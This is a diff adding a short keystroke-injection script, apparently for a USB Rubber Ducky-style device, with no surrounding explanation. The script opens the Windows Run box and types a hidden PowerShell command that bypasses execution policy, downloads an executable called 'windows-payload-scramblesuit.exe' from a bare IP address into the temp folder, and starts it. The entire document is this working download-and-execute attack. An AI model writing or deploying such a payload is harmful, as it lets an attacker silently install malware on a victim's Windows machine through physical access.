@@ -1,0 +1,4 @@
+GUI r
+DELAY 100
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://18.212.32.199/windows-payload-scramblesuit.exe',\"$env:temp\windows-payload-scramblesuit.exe\"); Start-Process \"$env:temp\windows-payload-scramblesuit.exe\""
+ENTER
